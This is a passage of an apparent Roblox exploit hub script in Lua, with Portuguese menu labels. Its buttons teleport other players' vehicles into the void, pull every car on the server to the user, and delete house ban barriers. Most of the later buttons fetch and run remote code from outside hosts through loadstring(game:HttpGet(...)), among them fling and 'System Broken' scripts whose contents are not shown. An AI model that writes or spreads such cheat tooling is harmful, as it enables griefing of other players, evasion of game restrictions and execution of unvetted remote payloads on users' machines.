      vector10 = Vector3.new(5, 0, 5)
      p30:SetPrimaryPartCFrame(CFrame.new(index60 + vector10))
      task.wait(0.5)
      return
    end
  end

  function v20:ExitCarAndReturn(p31)
    if not self.LocalPlayer.Character
      or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
      return
    else
      local humanoid33 = self.LocalPlayer.Character.Humanoid

      if humanoid33.SeatPart then
        humanoid33.Sit = false
      end

      task.wait(0.1)

      if p31 then
        self.LocalPlayer.Character:PivotTo(CFrame.new(p31))
      end

      return
    end
  end

  function v20:AtualizarListaCarros()
    local v152 = self.Workspace
    local v153 = {}
    local vehicles5 = v152:FindFirstChild("Vehicles")

    if vehicles5 then
      for index61, value92 in ipairs(vehicles5:GetChildren()) do
        if value92.Name:match("Car$") then
          table.insert(v153, value92.Name)
        end
      end
    end

    return v153
  end

  tab9:AddParagraph({ Title = "use o void protection", Content = "" })

  tab9:AddToggle({
    Name = "Matar todos os carros do server",
    Description = "Teleporta os carros para o void",
    Default = false,
    Callback = function(value93)
      local v154 = value93
      local f35, position3

      if value93 then
        if self.LocalPlayer.Character
          and self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
          position3 = self.LocalPlayer.Character.HumanoidRootPart.Position

          function f35()
            local vehicles6 = v20.Workspace:FindFirstChild("Vehicles")

            if not vehicles6 then
              v20:MostrarNotificacao("Pasta de veículos não encontrada!")
              return
            else
              local v155 = {}

              for index62, value94 in ipairs(vehicles6:GetChildren()) do
                if value94.Name:match("Car$") then
                  table.insert(v155, value94)
                end
              end

              for index63, value95 in ipairs(v155) do
                if not v154 then
                  break
                else
                  local findFirstChildWhichIsA = value95:FindFirstChildWhichIsA(
                    "VehicleSeat", true
                  )

                  if findFirstChildWhichIsA and findFirstChildWhichIsA.Occupant == nil then
                    if v20:TeleportToSeat(findFirstChildWhichIsA, value95) then
                      v20:TeleportToVoid(value95)
                      v20:ExitCarAndReturn(position3)
                      task.wait(1)
                    end
                  end
                end
              end

              if v154 then
                v154 = false
                v20:ToggleFallDamage(false)
              end

              return
            end
          end

          v20:ToggleFallDamage(true)
          spawn(f35)
          return
        end

        v20:MostrarNotificacao("Personagem não encontrado!")
        return
      end

      v154 = false
      v20:ToggleFallDamage(false)
    end,
  })

  tab9:AddSection({ "functions dos carro" })

  addDropdown = tab9:AddDropdown({
    Name = "Selecionar Carro do Jogador",
    Description = "Selecione o carro de um jogador",
    Default = nil,
    Options = v20:AtualizarListaCarros(),
    Callback = function(value96) _G.SelectedVehicle = value96 end,
  })

  tab9:AddToggle({
    Name = "Ver Câmera do Carro Selecionado",
    Description = "Foca a câmera no carro selecionado",
    Default = false,
    Callback = function(value97)
      if value97 then
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
          v20:MostrarNotificacao("Nenhum carro selecionado!")
          return
        else
          local vehicles7 = v20.Workspace:FindFirstChild("Vehicles")

          if not vehicles7 then
            v20:MostrarNotificacao("Pasta de veículos não encontrada!")
            return
          else
            local findFirstChild18 = vehicles7:FindFirstChild(_G.SelectedVehicle)

            if not findFirstChild18 then
              v20:MostrarNotificacao("Carro selecionado não encontrado!")
              return
            else
              local findFirstChildWhichIsA2 = findFirstChild18:FindFirstChildWhichIsA(
                "VehicleSeat", true
              )

              if not findFirstChildWhichIsA2 then
                v20:MostrarNotificacao("Assento do carro não encontrado!")
                return
              end

              v20.OriginalCameraSubject = v20.Camera.CameraSubject
              v20.OriginalCameraType = v20.Camera.CameraType
              v20.Camera.CameraSubject = findFirstChildWhichIsA2
              v20.Camera.CameraType = Enum.CameraType.Follow

              v20:MostrarNotificacao("Câmera ajustada para o carro " .. _G.SelectedVehicle
                .. "!")

              return
            end
          end
        end
      else
        if v20.OriginalCameraSubject then
          v20.Camera.CameraSubject = v20.OriginalCameraSubject

          local camera = v20.Camera
          camera.CameraType = v20.OriginalCameraType or Enum.CameraType.Custom

          v20:MostrarNotificacao("Câmera restaurada ao normal!")
          v20.OriginalCameraSubject = nil
          v20.OriginalCameraType = nil
        end

        return
      end
    end,
  })

  v20.Workspace:WaitForChild("Vehicles").ChildAdded:Connect(function()
    addDropdown:Set(v20:AtualizarListaCarros())
  end)

  v20.Workspace:WaitForChild("Vehicles").ChildRemoved:Connect(function()
    addDropdown:Set(v20:AtualizarListaCarros())
  end)

  tab9:AddSection({ "functions kill e trazer" })

  tab9:AddButton({
    Name = "Destruir Carro Selecionado",
    Description = "Teleporta o carro selecionado para o void",
    Callback = function()
      if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
        v20:MostrarNotificacao("Nenhum carro selecionado!")
        return
      else
        local vehicles8 = v20.Workspace:FindFirstChild("Vehicles")

        if not vehicles8 then
          v20:MostrarNotificacao("Pasta de veículos não encontrada!")
          return
        else
          local findFirstChild19 = vehicles8:FindFirstChild(_G.SelectedVehicle)

          if not findFirstChild19 then
            v20:MostrarNotificacao("Carro selecionado não encontrado!")
            return
          else
            local findFirstChildWhichIsA3 = findFirstChild19:FindFirstChildWhichIsA(
              "VehicleSeat", true
            )

            if not findFirstChildWhichIsA3 then
              v20:MostrarNotificacao("Assento do carro não encontrado!")
              return
            elseif findFirstChildWhichIsA3.Occupant then
              v20:MostrarNotificacao("O kill car não foi possível, há alguém sentado no assento do motorista!")
              return
            else
              if v20.LocalPlayer.Character
                and v20.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local position4 = v20.LocalPlayer.Character.HumanoidRootPart.Position
                v20:ToggleFallDamage(true)

                if v20:TeleportToSeat(findFirstChildWhichIsA3, findFirstChild19) then
                  v20:TeleportToVoid(findFirstChild19)

                  v20:MostrarNotificacao("Carro " .. _G.SelectedVehicle
                    .. " foi teleportado para o void!")

                  v20:ExitCarAndReturn(position4)
                else
                  v20:MostrarNotificacao("Falha ao sentar no carro!")
                end

                v20:ToggleFallDamage(false)
                return
              end

              v20:MostrarNotificacao("Personagem do jogador não encontrado!")
              return
            end
          end
        end
      end
    end,
  })

  tab9:AddButton({
    Name = "Trazer Carro Selecionado",
    Description = "Teleporta o carro selecionado para sua posição",
    Callback = function()
      if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
        v20:MostrarNotificacao("Nenhum carro selecionado!")
        return
      else
        local vehicles9 = v20.Workspace:FindFirstChild("Vehicles")

        if not vehicles9 then
          v20:MostrarNotificacao("Pasta de veículos não encontrada!")
          return
        else
          local findFirstChild20 = vehicles9:FindFirstChild(_G.SelectedVehicle)

          if not findFirstChild20 then
            v20:MostrarNotificacao("Carro selecionado não encontrado!")
            return
          else
            local findFirstChildWhichIsA4 = findFirstChild20:FindFirstChildWhichIsA(
              "VehicleSeat", true
            )

            if not findFirstChildWhichIsA4 then
              v20:MostrarNotificacao("Assento do carro não encontrado!")
              return
            elseif findFirstChildWhichIsA4.Occupant then
              v20:MostrarNotificacao("O teleporte do carro não foi possível, há alguém sentado no assento do motorista!")
              return
            else
              if v20.LocalPlayer.Character
                and v20.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local position5 = v20.LocalPlayer.Character.HumanoidRootPart.Position
                v20:ToggleFallDamage(true)

                if v20:TeleportToSeat(findFirstChildWhichIsA4, findFirstChild20) then
                  v20:TeleportToPlayer(findFirstChild20, position5)

                  v20:MostrarNotificacao("Carro " .. _G.SelectedVehicle
                    .. " foi teleportado para você!")

                  v20:ExitCarAndReturn(position5)
                else
                  v20:MostrarNotificacao("Falha ao sentar no carro!")
                end

                v20:ToggleFallDamage(false)
                return
              end

              v20:MostrarNotificacao("Personagem do jogador não encontrado!")
              return
            end
          end
        end
      end
    end,
  })

  tab9:AddButton({
    Name = "Trazer Todos os Carros",
    Description = "Teleporta todos os carros do servidor para sua posição",
    Callback = function()
      if v20.LocalPlayer.Character
        and v20.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local position6 = v20.LocalPlayer.Character.HumanoidRootPart.Position
        local vehicles10 = v20.Workspace:FindFirstChild("Vehicles")

        if not vehicles10 then
          v20:MostrarNotificacao("Pasta de veículos não encontrada!")
          return
        else
          v20:ToggleFallDamage(true)
          local v156 = {}

          for index64, value98 in ipairs(vehicles10:GetChildren()) do
            if value98.Name:match("Car$") then
              table.insert(v156, value98)
            end
          end

          for index65, value99 in ipairs(v156) do
            local findFirstChildWhichIsA5 = value99:FindFirstChildWhichIsA("VehicleSeat", true)

            if findFirstChildWhichIsA5 and findFirstChildWhichIsA5.Occupant == nil then
              if v20:TeleportToSeat(findFirstChildWhichIsA5, value99) then
                v20:TeleportToPlayer(value99, position6)
                v20:ExitCarAndReturn(position6)
                v20:MostrarNotificacao("Carro " .. value99.Name .. " foi teleportado para você!")

                task.wait(1)
              else
                v20:MostrarNotificacao("Falha ao sentar no carro " .. value99.Name .. "!")
              end
            elseif findFirstChildWhichIsA5 then
              v20:MostrarNotificacao("Carro " .. value99.Name
                .. " ignorado: alguém está no assento do motorista!")
            else
              v20:MostrarNotificacao("Carro " .. value99.Name
                .. " ignorado: assento não encontrado!")
            end
          end

          v20:ToggleFallDamage(false)

          if #v156 == 0 then
            v20:MostrarNotificacao("Nenhum carro disponível para teleportar!")
          end

          return
        end
      else
        v20:MostrarNotificacao("Personagem do jogador não encontrado!")
        return
      end
    end,
  })

  v20.LocalPlayer.CharacterAdded:Connect(function(character24)
    local humanoid34 = character24:WaitForChild("Humanoid")
    humanoid34:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
    humanoid34:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
  end)

  tab10:AddParagraph({ Title = "Funções para você usar em você", Content = "" })

  tab10:AddButton({
    Name = "Remover Ban de Todas as Casas",
    Description = "Tenta remover o ban de todas as casas ",
    Callback = function()
      local count = 0
      local count2 = 0

      for i = 1, 37 do
        local findFirstChild21 = workspaceService:FindFirstChild("BannedBlock" .. i, true)

        if findFirstChild21 then
          if pcall(function() findFirstChild21:Destroy() end) then
            count = count + 1
          else
            count2 = count2 + 1
          end
        end
      end

      for key5, value100 in pairs(workspaceService:GetDescendants()) do
        local v157 = value100

        if v157.Name:match("BannedBlock") then
          if pcall(function() v157:Destroy() end) then
            count = count + 1
          else
            count2 = count2 + 1
          end
        end
      end

      if count > 0 then
        starterGui:SetCore("SendNotification", {
          Title = "Sucesso",
          Text = "Bans removidos de " .. count .. " casas!",
          Duration = 5,
        })
      end

      if count2 > 0 then
        starterGui:SetCore("SendNotification", {
          Title = "Aviso",
          Text = "Falha ao remover bans de " .. count2 .. " casas.",
          Duration = 5,
        })
      end

      if count == 0 and count2 == 0 then
        starterGui:SetCore("SendNotification", {
          Title = "Aviso",
          Text = "Nenhum ban encontrado para remover.",
          Duration = 5,
        })
      end
    end,
  })

  tab12:AddButton({
    Name = "Naruto",
    Desc = "Naruto FE.",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas"))()
    end,
  })

  tab12:AddButton({
    Name = "Batman",
    Description = "Batman FE.",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas89"))()
    end,
  })

  tab12:AddButton({
    Name = "Sonic.Exe",
    Description = "Sonic.Exe FE.",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas86"))()
    end,
  })

  tab12:AddButton({
    Title = "Panico",
    Desc = "Pânico FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/yyyyyyyface/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Morty",
    Desc = "Morty FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/Mortyyyyyy/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Rick Sanchez",
    Desc = "Rick Sanchez FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/rick-Sanchez-/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Cowboy",
    Desc = "Cowboy FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/wjsj/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Guest666 FE",
    Desc = "Guest666 FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/swsw/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Camera De Carro",
    Desc = "carro no roblox kkj",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/Carfling/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Fe vr",
    Desc = "FE VR",
    Callback = function()
      task.delay(6, function()
        pcall(function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty45.lua"))()
        end)
      end)
    end,
  })

  tab12:AddButton({
    Title = "Obito",
    Desc = "Obito FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/c47b8a12ca6c4cef840280dafd893e7d"))()
    end,
  })

  tab12:AddButton({
    Name = "Shadow",
    Desc = "Shadow FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Shadow/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "Goner",
    Desc = "Executa o Goner fe",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/GONER/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "Noly",
    Desc = "Noly FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/gubby/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "Tubers",
    Desc = "Tubers FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/1222/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Title = "mãozinha",
    Desc = "mãozinha FE",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/slafiznotedio/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "C00LKIDD",
    Desc = "C00LKIDD FE",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/repositoryredzlib/xzzxsx/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Emote v2",
    Desc = "Emotes FREE",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Free-emote/refs/heads/main/Delta%20mad%20stuffs"))()
    end,
  })

  tab12:AddButton({
    Name = "Herobrine",
    Desc = "Herobrine FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/hEROBRINE/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "John doe",
    Description = "John Doe FE",
    Callback = function()
      pcall(function()
        local changeBodyColor = replicatedStorage.Remotes.ChangeBodyColor
        local changeCharacterBody = replicatedStorage.Remotes.ChangeCharacterBody
        local wear = replicatedStorage.Remotes.Wear
        changeBodyColor:FireServer("Really black")
        changeCharacterBody:InvokeServer({ 0, 0, 0, 0, 0, 0 })

        wear:InvokeServer(119700638189200)
        wear:InvokeServer(82561279414761)
        wear:InvokeServer(108099676910290)
        wear:InvokeServer(82861921093234)
        wear:InvokeServer(124476454384080)
        wear:InvokeServer(5319900634)
        wear:InvokeServer(5319909330)
        wear:InvokeServer(5319922112)
      end)
    end,
  })

  tab12:AddButton({
    Name = "CARTOON CAT",
    Description = "CARTOON CAT FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/cartoon-cat/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Name = "Ominitrix",
    Desc = "Ominitrix FE",
    Callback = function()
      pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Ominitrix/refs/heads/main/Main.txt"))()
      end)
    end,
  })

  tab12:AddButton({
    Title = "Kamui",
    Desc = "Ativa o Kamui (hubzin)",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/kamui/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Jerk",
    Desc = "Jerk FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/yeahblxr/Scripts/refs/heads/main/Edge.lua"))()
    end,
  })

  tab12:AddButton({
    Title = "Emotes fe",
    Desc = "Emotes fe :)",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AFEM-Max-Open-Alpha-50210"))()
    end,
  })

  tab12:AddButton({
    Title = "Jeff The Killer",
    Desc = "Jeff The Killer FE",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/267266273ffsfs/Jeff/refs/heads/main/Main.txt"))()
    end,
  })

  tab12:AddButton({
    Title = "Minecraft",
    Desc = "Minecraft no roblox kk",
    Locked = false,
    Callback = function()
      task.spawn(function()
        local wearShirt = replicatedStorage.Remotes:FindFirstChild("WearShirt")

        if wearShirt then
          pcall(function() wearShirt:InvokeServer(16512333409) end)
        end

        task.wait(0.2)
        local changeCharacterBody2 = replicatedStorage.Remotes:FindFirstChild("ChangeCharacterBody")

        if changeCharacterBody2 then
          pcall(function() changeCharacterBody2:InvokeServer({ 0, 0, 0, 0, 0, 0 }) end)
        end

        task.wait(0.2)
        local wearPants = replicatedStorage.Remotes:FindFirstChild("WearPants")

        if wearPants then
          pcall(function() wearPants:InvokeServer(16512431524) end)
        end

        task.wait(0.2)
        local wear2 = replicatedStorage.Remotes:FindFirstChild("Wear")

        if wear2 then
          pcall(function() wear2:InvokeServer(137179147781164) end)
        end

        task.wait(0.2)
        local changeBodyColor2 = replicatedStorage.Remotes:FindFirstChild("ChangeBodyColor")

        if changeBodyColor2 then
          changeBodyColor2:FireServer("Dark nougat")
        end
      end)

      local localPlayer11 = players.LocalPlayer

      local v158 = {
        LOGO_PADRAO,
      }

      local function f36(target)
        if not target:IsA("Part") then
          return false
        end

        for index66, value101 in ipairs(target:GetChildren()) do
          if value101:IsA("Decal") then
            for index67, value102 in ipairs(v158) do
              if value101.Texture == value102 then
                return true
              end
            end
          end
        end

        if target.Name == "Bloco com Fisica" then
          return true
        end

        if target.Size == Vector3.new(3, 3, 3) then
          return true
        end

        return false
      end

      local function f37(p32)
        local target2 = p32.Target

        if target2 and target2:IsA("BasePart") and f36(target2) then
          return target2
        end
      end

      local function f38(title, text2)
        starterGui:SetCore("SendNotification", { Title = title, Text = text2, Duration = 3 })
      end

      local swordGoner = Instance.new("Tool")
      swordGoner.Name = "Sword goner"
      swordGoner.RequiresHandle = true
      swordGoner.CanBeDropped = true

      local handle2 = Instance.new("Part")
      handle2.Name = "Handle"
      handle2.Size = Vector3.new(0.1, 0.1, 0.1)
      handle2.Massless = true
      handle2.Anchored = false
      handle2.CanCollide = false
      handle2.Transparency = 0.5
      handle2.Color = Color3.fromRGB(255, 0, 0)

      local instance3 = Instance.new("SpecialMesh", handle2)
      instance3.MeshType = Enum.MeshType.Sphere
      instance3.Scale = Vector3.new(0.05, 0.05, 0.05)

      handle2.Parent = swordGoner

      swordGoner.Equipped:Connect(function(p33)
        local parent = swordGoner.Parent

        if parent and parent:FindFirstChild("Humanoid")
          and parent.Humanoid.RigType == Enum.HumanoidRigType.R15 then
          replicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(12780809235)

          p33.Button1Down:Connect(function()
            local humanoid35 = parent:FindFirstChildOfClass("Humanoid")
            local animator3 = humanoid35 and humanoid35:FindFirstChildOfClass("Animator")

            if animator3 then
              local animation7 = Instance.new("Animation")
              animation7.AnimationId = "rbxassetid://2410679501"
              animator3:LoadAnimation(animation7):Play()
            end

            local v159 = f37(p33)

            if v159 then
              v159:Destroy()
              f38("🗑️ Bloco Deletado", "Bloco spawnado removido com sucesso!")
            else
              f38("💡 Info", "Clique em um bloco spawnado para deletá-lo!")
            end
          end)

          f38("Picareta equipada", "Clique em blocos spawnados para deletá-los!")
        end
      end)

      swordGoner.Unequipped:Connect(function()
        replicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(12780809235)
        f38("Picareta Guardada", "Tool desequipado! Visual restaurado.")
      end)

      swordGoner.Parent = localPlayer11.Backpack

      local function makeTool(textureId, texture, p34)
        local tool = Instance.new("Tool")
        tool.Name = ""
        tool.TextureId = textureId
        tool.CanBeDropped = false
        tool.Parent = localPlayer11.Backpack

        local handle3 = Instance.new("Part")
        handle3.Name = "Handle"
        handle3.Size = Vector3.new(1.5, 1.5, 1.5)
        handle3.Anchored = false
        handle3.CanCollide = false
        handle3.Color = Color3.fromRGB(255, 255, 255)
        handle3.Parent = tool

        for index68, value103 in ipairs(Enum.NormalId:GetEnumItems()) do
          local decal = Instance.new("Decal")
          decal.Texture = texture
          decal.Face = value103
          decal.Parent = handle3
        end

        local getMouse = localPlayer11:GetMouse()

        tool.Activated:Connect(function()
          local p = getMouse.Hit.p

          local blocoComFSica = Instance.new("Part")
          blocoComFSica.Size = Vector3.new(3, 3, 3)
          blocoComFSica.Anchored = not p34
          blocoComFSica.Position = p + Vector3.new(0, 1.5, 0)
          blocoComFSica.Parent = workspace

          if p34 then
            blocoComFSica.CanCollide = true
            blocoComFSica.Name = "Bloco com Física"
          end

          for index69, value104 in ipairs(Enum.NormalId:GetEnumItems()) do
            local decal2 = Instance.new("Decal")
            decal2.Texture = texture
            decal2.Face = value104
            decal2.Parent = blocoComFSica
          end
        end)
      end

      local function makeTool2(textureId2, texture2, texture3)
        local tool2 = Instance.new("Tool")
        tool2.Name = ""
        tool2.TextureId = textureId2
        tool2.CanBeDropped = false
        tool2.Parent = localPlayer11.Backpack

        local handle4 = Instance.new("Part")
        handle4.Name = "Handle"
        handle4.Size = Vector3.new(1.5, 1.5, 1.5)
        handle4.Anchored = false
        handle4.CanCollide = false
        handle4.Color = Color3.fromRGB(255, 255, 255)
        handle4.Parent = tool2

        for index70, value105 in ipairs(Enum.NormalId:GetEnumItems()) do
          local decal3 = Instance.new("Decal")
          decal3.Texture = texture2
          decal3.Face = value105
          decal3.Parent = handle4
        end

        local getMouse2 = localPlayer11:GetMouse()

        tool2.Activated:Connect(function()
          local p35 = getMouse2.Hit.p

          local part = Instance.new("Part")
          part.Size = Vector3.new(3, 3, 3)
          part.Anchored = true
          part.Position = p35 + Vector3.new(0, 1.5, 0)
          part.Parent = workspace

          for index71, value106 in ipairs(Enum.NormalId:GetEnumItems()) do
            local decal4 = Instance.new("Decal")

            if value106 == Enum.NormalId.Top then
              decal4.Texture = texture3
            else
              decal4.Texture = texture2
            end

            decal4.Face = value106
            decal4.Parent = part
          end
        end)
      end

      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool2(LOGO_PADRAO, LOGO_PADRAO, LOGO_PADRAO)

      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, true)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)
      makeTool(LOGO_PADRAO, LOGO_PADRAO, false)

      local tool3 = Instance.new("Tool")
      tool3.Name = ""
      tool3.TextureId = LOGO_PADRAO
      tool3.CanBeDropped = false
      tool3.Parent = localPlayer11.Backpack

      local handle5 = Instance.new("Part")
      handle5.Name = "Handle"
      handle5.Size = Vector3.new(1.5, 1.5, 1.5)
      handle5.Anchored = false
      handle5.CanCollide = false
      handle5.Transparency = 1
      handle5.Parent = tool3

      for index72, value107 in ipairs(Enum.NormalId:GetEnumItems()) do
        local decal5 = Instance.new("Decal")
        decal5.Texture = LOGO_PADRAO
        decal5.Face = value107
        decal5.Parent = handle5
      end

      local getMouse3 = localPlayer11:GetMouse()

      tool3.Activated:Connect(function()
        local p36 = getMouse3.Hit.p

        local part2 = Instance.new("Part")
        part2.Size = Vector3.new(3, 3, 3)
        part2.Position = p36 + Vector3.new(0, 1.5, 0)
        part2.Anchored = true
        part2.CanCollide = true
        part2.Transparency = 1
        part2.Parent = workspace

        for index73, value108 in ipairs(Enum.NormalId:GetEnumItems()) do
          local decal6 = Instance.new("Decal")
          decal6.Texture = LOGO_PADRAO
          decal6.Face = value108
          decal6.Parent = part2
        end
      end)

      f38(
        "Minecraft FE", "Script carregado com sucesso! Ferramentas adicionadas ao inventário."
      )
    end,
  })

  tab13:AddButton({
    Name = "FE Jerk Off Hub Matrix",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
    end,
  })

  tab13:AddButton({
    Name = "FE HUGG",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/fe/refs/heads/main/FEHUGG"))()
    end,
  })

  tab13:AddButton({
    Name = "Buraco Negro",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))("More Scripts: t.me/arceusxscripts")
    end,
  })

  tab11:AddSection({ "esse system broochk e voidProtection" })

  tab13:AddButton({
    Name = "System Broochk",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
    end,
  })

  tab13:AddButton({
    Name = "Roships",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-rochips-universal-18294"))()
    end,
  })

  tab13:AddButton({
    Name = "Sander X",
    Description = "Somente para Brookhaven",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/SanderXV4.2.2/refs/heads/main/New.lua"))()
    end,
  })

  tab13:AddButton({
    Name = "Reverso",
    Description = "Universal",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/L"))()
    end,
  })

  tab13:AddButton({
    Name = "RD4",
    Description = "Somente para Brookhaven",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script"))()
    end,
  })

  return
end
